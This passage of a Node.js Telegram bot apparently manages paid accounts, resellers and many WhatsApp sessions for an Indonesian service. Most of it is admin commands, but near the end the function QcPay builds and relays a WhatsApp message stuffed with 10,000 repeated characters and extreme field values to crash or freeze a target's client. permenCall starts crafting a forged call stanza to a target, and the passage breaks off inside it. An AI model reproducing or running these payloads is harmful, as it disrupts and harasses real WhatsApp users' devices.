    const newRole = args.join("_").toUpperCase();

    const db = loadDatabase();
    const user = db.find(u => u.username === username);
    if (!user) return bot.sendMessage(chatId, "❌ Username tidak ditemukan.");

    const oldRole = user.role;
    user.role = newRole;
    user.manualRole = true;
    await safeSaveDatabase(db);

    return bot.sendMessage(chatId, `
✅ <b>ROLE BERHASIL DIUBAH</b>

👤 <b>${username}</b>
🎯 ${oldRole.toUpperCase()} ➜ ${newRole}
⏳ Expired: ${formatDateExp(user.expiredDate)}
`, { parse_mode: "HTML" });
});
bot.onText(/^\/accrole\s+(.+)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
    }

    const input = match[1].trim();
    if (!input.includes(",")) {
        return bot.sendMessage(
            chatId,
            "❌ Format salah.\nGunakan:\n/accrole username,password"
        );
    }

    const [username, password] = input.split(",").map(v => v.trim());
    if (!username || !password) {
        return bot.sendMessage(chatId, "❌ Username atau password kosong.");
    }

    const db = loadDatabase();


    if (db.find(u => u.username === username)) {
        return bot.sendMessage(chatId, "❌ Username sudah terdaftar.");
    }


    const expiredDate = createExpiryIsoWib(7);


    db.push({
        username,
        password,
        role: "REVIEW",
        expiredDate,
        createdAt: new Date().toISOString()
    });

    saveDatabase(db);

    bot.sendMessage(
        chatId,
        `✅ AKUN REVIEW BERHASIL DIBUAT\n\n` +
        `👤 Username : ${username}\n` +
        `🔑 Password : ${password}\n` +
        `🔒 Role     : REVIEW\n` +
        `⏳ Expired  : ${formatDateExp(expiredDate)}\n\n` +
        `⚠️ Akun ini READ-ONLY\nTidak bisa menggunakan API apa pun.`
    );
});
const ITEMS_PER_PAGE = 5;
const activePages = {};

bot.onText(/^\/listtqto$/i, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");

    const db = loadContributors();
    const list = db.contributors;

    if (!list.length) return bot.sendMessage(chatId, "📭 Belum ada contributor.");

    const key = `${chatId}_${fromId}`;
    activePages[key] = { page: 0, list };

    sendListPage(chatId, fromId);
});

function sendListPage(chatId, userId) {
    const key = `${chatId}_${userId}`;
    const data = activePages[key];
    if (!data) return;

    const start = data.page * ITEMS_PER_PAGE;
    const end = start + ITEMS_PER_PAGE;
    const pageItems = data.list.slice(start, end);

    let text = "📜 *DAFTAR TEAM MANTA*\n\n";

    pageItems.forEach((c, i) => {
        text += `*${start + i + 1}.* ${c.nama}\n`;
        text += `   ├ Telegram : @${c.telegram}\n`;
        text += `   └ Role     : ${c.role}\n\n`;
    });

    const buttons = [];
    if (data.page > 0) buttons.push({ text: "⬅️ Back", callback_data: `listtqto_back_${key}` });
    if (end < data.list.length) buttons.push({ text: "Next ➡️", callback_data: `listtqto_next_${key}` });

    bot.sendMessage(chatId, text, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: [buttons] },
    });
}

bot.on("callback_query", (query) => {
    if (!query.data.startsWith("listtqto_")) return;

    const key = query.data.split("_").slice(2).join("_"); // ambil sisa string sebagai key
    const data = activePages[key];
    if (!data) return bot.answerCallbackQuery(query.id);

    if (query.data.startsWith("listtqto_next_")) data.page++;
    if (query.data.startsWith("listtqto_back_")) data.page--;

    bot.editMessageText(generatePageText(data), {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: generateButtons(data, key) },
    });

    bot.answerCallbackQuery(query.id);
});

function generatePageText(data) {
    const start = data.page * ITEMS_PER_PAGE;
    const end = start + ITEMS_PER_PAGE;
    const pageItems = data.list.slice(start, end);

    let text = "📜 *DAFTAR TEAM MANTA*\n\n";
    pageItems.forEach((c, i) => {
        text += `*${start + i + 1}.* ${c.nama}\n`;
        text += `   ├ Telegram : @${c.telegram}\n`;
        text += `   └ Role     : ${c.role}\n\n`;
    });
    return text;
}

function generateButtons(data, key) {
    const start = data.page * ITEMS_PER_PAGE;
    const end = start + ITEMS_PER_PAGE;
    const buttons = [];
    if (data.page > 0) buttons.push({ text: "⬅️ Back", callback_data: `listtqto_back_${key}` });
    if (end < data.list.length) buttons.push({ text: "Next ➡️", callback_data: `listtqto_next_${key}` });
    return [buttons];
}
bot.onText(/^\/deltqto\s+(\d+)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
    }

    const index = parseInt(match[1]) - 1;
    const db = loadContributors();

    if (index < 0 || index >= db.contributors.length) {
        return bot.sendMessage(chatId, "❌ Nomor contributor tidak valid.");
    }

    const removed = db.contributors.splice(index, 1)[0];
    saveContributors(db);

    bot.sendMessage(
        chatId,
        `🗑️ *Contributor dihapus!*\n\n👤 ${removed.nama}`,
        { parse_mode: "Markdown" }
    );
});
const DEL_API_STATE = {}; // { userId: true }
bot.onText(/^\/generateapikey(?:\s+(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = Number(msg.from?.id);
    const configuredOwners = loadTelegramConfig().ownerList.map(Number);
    if (fromId !== OWNER_ID && !configuredOwners.includes(fromId)) {
        return bot.sendMessage(chatId, 'Akses ditolak.');
    }

    const username = String(match?.[1] || '').trim();
    if (!username || !/^[a-zA-Z0-9_.-]{2,64}$/.test(username)) {
        return bot.sendMessage(chatId, 'Format: /generateapikey username');
    }

    const db = loadDatabaseFresh();
    const user = db.find(item => item?.username?.trim().toLowerCase() === username.toLowerCase());
    if (!user) return bot.sendMessage(chatId, 'Username tidak ditemukan.');

    const key = generatePaymentApiKey();
    const keys = loadPaymentKeys().filter(item => item.username?.toLowerCase() !== user.username.toLowerCase());
    keys.push({
        username: user.username,
        key_hash: hashPaymentKey(key),
        active: true,
        created_at: new Date().toISOString(),
    });
    savePaymentKeys(keys);

    return bot.sendMessage(chatId,
        `API key KAZE X untuk ${user.username}:\n\n<code>${key}</code>\n\nSimpan key ini. Key tidak ditampilkan ulang.`,
        { parse_mode: 'HTML' });
});

bot.onText(/^\/addapi$/i, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
    }

    ADD_API_STATE[fromId] = { step: "API_ID" };

    bot.sendMessage(chatId, "📌 *Masukkan API_ID:*", {
        parse_mode: "Markdown",
    });
});
bot.onText(/^\/listapi$/i, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
    }

    if (!fs.existsSync("apitele.json")) {
        return bot.sendMessage(chatId, "❌ Tidak ada data API.");
    }

    const apiList = JSON.parse(fs.readFileSync("apitele.json"));

    if (apiList.length === 0) {
        return bot.sendMessage(chatId, "📭 Daftar API kosong.");
    }

    let text = "*📦 DAFTAR API PACKAGE*\n\n";

    apiList.forEach((api, i) => {
        text += `*${i + 1}. API_ID:* \`${api.apiId}\`\n`;
        text += `*API_HASH:* \`${api.apiHash.slice(0, 6)}••••${api.apiHash.slice(-4)}\`\n\n`;
    });

    bot.sendMessage(chatId, text.trim(), { parse_mode: "Markdown" });
});
bot.onText(/^\/delapi$/i, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
    }

    if (!fs.existsSync("apitele.json")) {
        return bot.sendMessage(chatId, "❌ Tidak ada data API.");
    }

    const apiList = JSON.parse(fs.readFileSync("apitele.json"));

    if (apiList.length === 0) {
        return bot.sendMessage(chatId, "📭 Tidak ada API untuk dihapus.");
    }

    let text = "*🗑️ PILIH API YANG AKAN DIHAPUS*\n\n";
    apiList.forEach((api, i) => {
        text += `*${i + 1}.* API_ID: \`${api.apiId}\`\n`;
    });

    DEL_API_STATE[fromId] = true;

    bot.sendMessage(chatId, text + "\nKirim *nomor API* yang ingin dihapus:", {
        parse_mode: "Markdown",
    });
});
bot.on("message", (msg) => {
    const fromId = msg.from?.id;
    const text = msg.text;
    const chatId = msg.chat.id;

    if (!ADD_TQTO_STATE[fromId] || !text) return;

    const state = ADD_TQTO_STATE[fromId];

    switch (state.step) {
        case "NAMA":
            state.data.nama = text;
            state.step = "TELEGRAM";
            return bot.sendMessage(chatId, "📌 Masukkan *username Telegram* (tanpa @):", {
                parse_mode: "Markdown",
            });

        case "TELEGRAM":
            state.data.telegram = text.replace("@", "");
            state.step = "ROLE";
            return bot.sendMessage(chatId, "📌 Masukkan *ROLE* (Owner / Dev / UI):", {
                parse_mode: "Markdown",
            });

        case "ROLE":
            state.data.role = text;
            state.step = "AVATAR";
            return bot.sendMessage(
                chatId,
                "📌 Masukkan *Avatar URL* (atau ketik `skip`):",
                { parse_mode: "Markdown" }
            );

        case "AVATAR":
            state.data.avatar =
                text.toLowerCase() === "skip"
                    ? "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg"
                    : text;


            const db = loadContributors();
            db.contributors.push(state.data);
            saveContributors(db);

            bot.sendMessage(chatId, "✅ *Contributor berhasil ditambahkan!*", {
                parse_mode: "Markdown",
            });

            delete ADD_TQTO_STATE[fromId];
            break;
    }
});
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const text = msg.text;

    if (!ADD_API_STATE[fromId]) return;
    if (!text || text.startsWith("/")) return;

    const state = ADD_API_STATE[fromId];


    if (state.step === "API_ID") {
        if (!/^\d+$/.test(text)) {
            return bot.sendMessage(chatId, "❌ API_ID harus angka.");
        }

        state.apiId = Number(text);
        state.step = "API_HASH";

        return bot.sendMessage(chatId, "📌 *Masukkan API_HASH:*", {
            parse_mode: "Markdown",
        });
    }


    if (state.step === "API_HASH") {
        const apiHash = text.trim();

        if (apiHash.length < 20) {
            return bot.sendMessage(chatId, "❌ API_HASH tidak valid.");
        }

        let apiList = [];
        if (fs.existsSync("apitele.json")) {
            apiList = JSON.parse(fs.readFileSync("apitele.json"));
        }

        apiList.push({
            apiId: state.apiId,
            apiHash: apiHash,
        });

        fs.writeFileSync(
            "apitele.json",
            JSON.stringify(apiList, null, 2)
        );

        delete ADD_API_STATE[fromId];

        return bot.sendMessage(
            chatId,
            `✅ *API berhasil ditambahkan!*\n\nAPI_ID: \`${state.apiId}\`\nAPI_HASH: \`${apiHash}\``,
            { parse_mode: "Markdown" }
        );
    }

    if (DEL_API_STATE[fromId]) {
        if (!/^\d+$/.test(text)) {
            return bot.sendMessage(chatId, "❌ Masukkan nomor yang valid.");
        }

        const index = Number(text) - 1;

        let apiList = JSON.parse(fs.readFileSync("apitele.json"));

        if (index < 0 || index >= apiList.length) {
            return bot.sendMessage(chatId, "❌ Nomor API tidak ditemukan.");
        }

        const removed = apiList.splice(index, 1)[0];

        fs.writeFileSync(
            "apitele.json",
            JSON.stringify(apiList, null, 2)
        );

        delete DEL_API_STATE[fromId];

        return bot.sendMessage(
            chatId,
            `✅ API berhasil dihapus\n\nAPI_ID: \`${removed.apiId}\``,
            { parse_mode: "Markdown" }
        );
    }
});

bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    const allowedIds = [OWNER_ID, 7027155167, 6252224704];
    if (!allowedIds.includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    const username = match[1].trim().toLowerCase();

    try {
        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
        if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

        const db = JSON.parse(fs.readFileSync("database.json"));
        const keys = JSON.parse(fs.readFileSync("keyList.json"));


        const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
        const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

        if (!dbUser && !keyUser) {
            return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
        }


        const role = dbUser?.role || "member";
        const expired = dbUser?.expiredDate ? formatDateExp(dbUser.expiredDate) : "Tidak ada";
        const lastSend = dbUser?.lastSend
            ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
            : "Belum pernah";


        const lastLogin = keyUser?.lastLogin
            ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
            : "Belum login";
        const ip = keyUser?.ipAddress || "Tidak diketahui";
        const android = keyUser?.androidId || "-";
        const session = keyUser?.sessionKey || "-";


        const creatorName = dbUser?.createdByName || dbUser?.createdBy || '-';
        const creatorTgId = dbUser?.createdById || '-';
        const userTgId = dbUser?.telegramId || '-';
        const createdAt = dbUser?.createdAt
            ? new Date(dbUser.createdAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
            : '-';

        const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`

*── Info Kreator ──*
*Dibuat Oleh:* ${creatorName}
*ID Telegram Kreator:* \`${creatorTgId}\`
*ID Telegram User:* \`${userTgId}\`
*Dibuat Pada:* ${createdAt}
`.trim();

        await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    } catch (err) {
        console.error("❌ Error info:", err);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
    }
});


bot.onText(/^\/?delete\s+(\S+)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    const allowedIds = [OWNER_ID, 7027155167, 6252224704];
    if (!allowedIds.includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    const username = match[1].trim().toLowerCase();

    try {
        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");

        const db = JSON.parse(fs.readFileSync("database.json"));
        const index = db.findIndex(u => (u.username || "").toLowerCase() === username);

        if (index === -1) {
            return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan di database.`, { parse_mode: "Markdown" });
        }

        const targetUser = db[index];


        removeUserFromDatabase(db, index);
        fs.writeFileSync("database.json", JSON.stringify(db, null, 2));


        if (fs.existsSync("keyList.json")) {
            const keyList = JSON.parse(fs.readFileSync("keyList.json"));
            const cleanedKeyList = keyList.filter(e => (e.username || "").toLowerCase() !== username);
            fs.writeFileSync("keyList.json", JSON.stringify(cleanedKeyList, null, 2));
        }


        for (const k in activeKeys) {
            if ((activeKeys[k].username || "").toLowerCase() === username) {
                delete activeKeys[k];
            }
        }


        fs.appendFileSync(
            "logUser.txt",
            `ID:${fromId} Deleted ${targetUser.username} via Telegram\n`
        );

        bot.sendMessage(chatId, `✅ Akun *${targetUser.username}* berhasil dihapus!`, { parse_mode: "Markdown" });

    } catch (err) {
        console.error("❌ Error delete:", err);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghapus akun.");
    }
});

bot.onText(/^\/?resetdevice\s+(\S+)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const username = match[1].trim();

    try {
        const role = await resolveUserRole(fromId).catch(() => null);
        const config = loadTelegramConfig();
        const ownerList = (config.ownerList || []).map(Number);
        const isOwner = ownerList.includes(fromId) || fromId === OWNER_ID || [7027155167, 6252224704].includes(fromId);

        if (!isOwner && role !== "TK" && role !== "PT" && role !== "RESELLER") {
            return bot.sendMessage(chatId, "❌ Akses ditolak");
        }

        const db = loadDatabaseFresh();
        const user = db.find(u => u.username.toLowerCase() === username.toLowerCase());

        if (!user) {
            return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
        }

        if (!isOwner && user.createdById !== fromId && user.createdBy !== msg.from.username) {
            return bot.sendMessage(chatId, "❌ Kamu hanya bisa mereset device untuk akun yang kamu buat sendiri.");
        }

        if (fs.existsSync("keyList.json")) {
            const keyList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
            const userKey = keyList.find(e => (e.username || "").toLowerCase() === username.toLowerCase());

            if (userKey) {
                delete userKey.androidId;
                fs.writeFileSync("keyList.json", JSON.stringify(keyList, null, 2));
            }
        }

        for (const k in activeKeys) {
            if ((activeKeys[k].username || "").toLowerCase() === username.toLowerCase()) {
                delete activeKeys[k];
            }
        }

        bot.sendMessage(chatId, `✅ Device lock untuk akun *${user.username}* berhasil di-reset!\n\nSilakan suruh user login ulang di aplikasinya.`, { parse_mode: "Markdown" });
    } catch (err) {
        console.error("❌ Error resetdevice:", err);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mereset device akun.");
    }
});
bot.onText(/\/upback/i, async msg => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Akses ditolak");
    }

    try {
        const files = fs.readdirSync(BACKUP_DIR)
            .filter(f => f.endsWith(".json"))
            .sort()
            .reverse();

        if (!files.length) {
            return bot.sendMessage(chatId, "❌ Tidak ada file backup");
        }

        const latest = path.join(BACKUP_DIR, files[0]);

        await bot.sendDocument(
            chatId,
            latest,
            { caption: "📦 Backup database terbaru" }
        );
    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal upload backup");
    }
});

const startTime = Date.now();

function getUptime() {
    const seconds = Math.floor((Date.now() - startTime) / 1000);
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
    const chatId = msg.chat.id;

    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    try {

        let users = [];
        if (fs.existsSync("database.json")) {
            users = JSON.parse(fs.readFileSync("database.json"));
        }

        const totalUser = users.length;
        const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

        const owners = countRole("owner");
        const resellers = countRole("RESELLER");
        const vips = countRole("vip");
        const members = countRole("member");


        const connectedMess = Object.keys(mess || {}).length || 0;
        const connectedBiz = Object.keys(biz || {}).length || 0;
        const connectedNumbers = Object.keys(activeConnections || {}).length || 0;


        const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

        await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    } catch (err) {
        console.error("❌ Error stats:", err);
        bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
    }
});

bot.onText(/^\/?statususer$/, async (msg) => {
    const chatId = msg.chat.id;

    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    try {
        const dbPath = "./database.json";
        const logPath = "logUser.txt";

        if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
        const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

        if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

        const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);


        const countMap = {};
        for (const line of logs) {
            const match = line.match(/^(\S+)\s+Created\s+/);
            if (match) {
                const creator = match[1];
                countMap[creator] = (countMap[creator] || 0) + 1;
            }
        }


        const list = db.map(u => ({
            username: u.username,
            role: u.role || "member",
            total: countMap[u.username] || 0
        }));


        list.sort((a, b) => b.total - a.total);


        let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
        teks += `Username | Role | Total Akun Dibuat\n`;
        teks += `-------------------------------------\n`;

        for (const u of list) {
            teks += `${u.username} | ${u.role} | ${u.total}\n`;
        }

        const filePath = "./statususer.txt";
        fs.writeFileSync(filePath, teks);

        await bot.sendDocument(chatId, filePath, {
            caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
        });

        fs.unlinkSync(filePath); // hapus file setelah dikirim
    } catch (err) {
        console.error("[❌ STATUSUSER ERROR]", err.message);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
    }
});

const SESSION_PATH = path.join(__dirname, "otaxayun");


bot.onText(/^\/?clearsession/, async (msg) => {
    const chatId = msg.chat.id;

    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    try {
        if (!fs.existsSync(SESSION_PATH)) {
            return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
        }


        fs.rmSync(SESSION_PATH, { recursive: true, force: true });
        fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

        bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *otaxayun* dikosongkan).");
        console.log("🧹 Semua session telah dihapus melalui /clearsession");
    } catch (err) {
        console.error("❌ Error saat clear session:", err);
        bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
    }
});

bot.onText(/^\/?clear/, async (msg) => {
    const chatId = msg.chat.id;

    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    try {
        if (!fs.existsSync(SESSION_PATH)) {
            return bot.sendMessage(chatId, "⚠️ Folder 'otaxayun' tidak ditemukan.");
        }

        let deletedCount = 0;
        const userFolders = fs.readdirSync(SESSION_PATH);

        for (const userFolder of userFolders) {
            const userPath = path.join(SESSION_PATH, userFolder);

            if (!fs.lstatSync(userPath).isDirectory()) continue;


            const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
            if (!hasJson) {
                fs.rmSync(userPath, { recursive: true, force: true });
                deletedCount++;
            }
        }

        bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
        console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
    } catch (err) {
        console.error("❌ Error saat clear session:", err);
        bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
    }
});


bot.onText(/^\/?restart$/, async (msg) => {
    const chatId = msg.chat.id;

    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    console.log("♻️ Restart manual dijalankan...");

    setTimeout(() => {
    }, 8000); // kirim pesan sukses setelah 8 detik


    setTimeout(() => {
        process.exit(0);
    }, 5000);
});

bot.onText(/^\/?zip$/i, async (msg) => {
    const chatId = msg.chat.id;

    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    if (msg.reply_to_message && msg.reply_to_message.document) {
        const doc = msg.reply_to_message.document;
        if (doc.file_name && doc.file_name.endsWith('.zip')) {
            try {
                bot.sendMessage(chatId, "⏳ Mendownload file zip...");
                const fileLink = await bot.getFileLink(doc.file_id);

                const response = await axios({
                    method: 'GET',
                    url: fileLink,
                    responseType: 'stream'
                });

                const zipPath = path.join(__dirname, 'bot.zip');
                const writer = fs.createWriteStream(zipPath);

                response.data.pipe(writer);

                writer.on('finish', () => {
                    bot.sendMessage(chatId, "✅ File bot.zip berhasil diupdate! File siap digunakan untuk instalasi panel.");
                });
                writer.on('error', (err) => {
                    console.error("Write stream error:", err);
                    bot.sendMessage(chatId, "❌ Gagal menyimpan file bot.zip");
                });
            } catch (err) {
                console.error("Download Error:", err);
                bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mendownload file zip.");
            }
        } else {
            bot.sendMessage(chatId, "❌ File yang di-reply bukan berformat .zip!");
        }
    } else {
        bot.sendMessage(chatId, "❌ Silakan reply sebuah file document .zip dengan mengetik /zip");
    }
});


// app.listen DIHAPUS - server sudah listen via http.createServer(app).listen(wsPort)
// Logic dipindah ke dalam server.listen callback
// Menghindari EADDRINUSE karena duplikat listen di port yang sama

// Jalankan session cleanup setiap 60 detik
setInterval(async () => {
    try {
        const baseDir = path.join(process.cwd(), 'otaxayun');
        if (!fs.existsSync(baseDir)) return;

        const keys = Object.keys(activeConnections);
        let cleaned = 0;
        let idleDisconnected = 0;
        const IDLE_TIMEOUT_MS = 10 * 60 * 1000;
        const now = Date.now();

        for (const key of keys) {
            const sock = activeConnections[key];
            if (!sock) { delete activeConnections[key]; cleaned++; continue; }
            const ws = sock?.ws?.readyState ?? sock?.ws?.socket?.readyState;
            if (ws === 2 || ws === 3 || ws === undefined || ws === null) {
                try { sock?.ev?.removeAllListeners?.(); } catch (_) { }
                try { if (sock.__healthbeat) clearInterval(sock.__healthbeat); } catch (_) { }
                try { sock?.ws?.close(); } catch (_) { }
                try { sock?.end?.(undefined); } catch (_) { }
                delete activeConnections[key];
                if (sessionRegistry[key]) sessionRegistry[key].connected = false;
                cleaned++;
                continue;
            }
            const lastUsed = sessionRegistry[key]?.lastUsed || sock?.lastChecked || 0;
            if (lastUsed > 0 && (now - lastUsed) > IDLE_TIMEOUT_MS) {
                console.log(`[IDLE-DISCONNECT] 🔌 Disconnect idle socket: ${key} (${Math.round((now - lastUsed) / 60000)}m idle)`);
                try { sock?.ev?.removeAllListeners?.(); } catch (_) { }
                try { if (sock.__healthbeat) clearInterval(sock.__healthbeat); } catch (_) { }
                try { sock?.ws?.close(); } catch (_) { }
                try { sock?.end?.(undefined); } catch (_) { }
                delete activeConnections[key];
                if (sessionRegistry[key]) sessionRegistry[key].connected = false;
                idleDisconnected++;
            }
        }

        const activeCount = Object.keys(activeConnections).length;
        const registryCount = Object.keys(sessionRegistry).length;
        if (cleaned > 0 || idleDisconnected > 0) {
            console.log(`[PRE-WARM] 🧹 Cleaned: ${cleaned} dead, ${idleDisconnected} idle | Active: ${activeCount}/${registryCount}`);
        }
    } catch (err) {
        console.error(`[PRE-WARM] Error:`, err.message);
    }
}, 60000);
const BACKUP_OWNER_ID = '1925763520';


function doCleanup() {
    if (typeof pendingSetor !== 'undefined' && pendingSetor) pendingSetor.clear();
    if (typeof pendingPakai !== 'undefined' && pendingPakai) pendingPakai.clear();
    if (typeof pendingKonfirm !== 'undefined' && pendingKonfirm) pendingKonfirm.clear();

    console.log(`[CLEANUP] done | activeSendJobs=${activeSendJobs}/${MAX_SEND_JOBS}`);
}

async function safeHourlyTask() {
    if (activeSendJobs > 0) {
        setTimeout(safeHourlyTask, 5 * 60 * 1000);
        return;
    }

    doCleanup();
    await runBackup('auto-cleanup', null);
}


async function QcPay(otax, target, zid = true) {
    const payload = "꧀".repeat(10000)
    const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
        interactiveMessage: {
            body: {
                text: payload
            },
            nativeFlowMessage: {
                messageVersion: 3,
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: payload,
                            id: `detail`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: payload,
                            id: `ssss`
                        })
                    }

                ]
            },
            contextInfo: {
                conversionDelaySeconds: 9999,
                forwardingScore: 999999,
                isForwarded: true,
                participant: "0@s.whatsapp.net",
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "1@newsletter",
                    serverMessageId: 1,
                    newsletterName: payload,
                    contentType: 3,
                },
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: 999e+21 * 999e+21
                    }
                },
                remoteJid: "@s.whatsapp.net"
            }
        }
    }), {});

    await otax.relayMessage(target, miaw.message, zid ? { messageId: miaw.key.id, participant: { jid: target } } : { messageId: miaw.key.id });
    await sleep(10000);
}

async function permenCall(otax, toJid, isVideo = true) {
    const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);

    const callLayout = []
    const offerContent = [

        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        isVideo ? {
            tag: 'video',
            attrs: {
                enc: 'vp8',
                dec: 'vp8',
                orientation: '0',
                screen_width: '1920',
                screen_height: '1080',
                device_orientation: '0'
            }
        } : null,
        { tag: 'net', attrs: { medium: '3' } },
        { tag: 'capability', attrs: { ver: '1' }, content: Buffer.from([0x00, 0x00, 0x00, 0x00]) },
        { tag: 'encopt', attrs: { keygen: '2' } }
    ].filter(Boolean);

    callLayout.push({ tag: 'title', attrs: { ver: '1' }, content: 'PermenMD' })
    const encKey = crypto.randomBytes(32);
    const devices = (await otax.getUSyncDevices([toJid], true, false))
        .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

    await otax.assertSessions(devices, true);

    const { nodes: destinations, shouldIncludeDeviceIdentity } = await otax.createParticipantNodes(devices, {
        call: { callKey: new Uint8Array(encKey) }
    }, { count: '2' });

    offerContent.push({ tag: 'destination', attrs: {}, content: destinations });

    if (shouldIncludeDeviceIdentity) {
        const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
        offerContent.push({
            tag: 'device-identity',
            attrs: {},
            content: encodeSignedDeviceIdentity(otax.authState.creds.account, true)
        });
    }

    const stanza = {
        tag: 'call',
        attrs: {
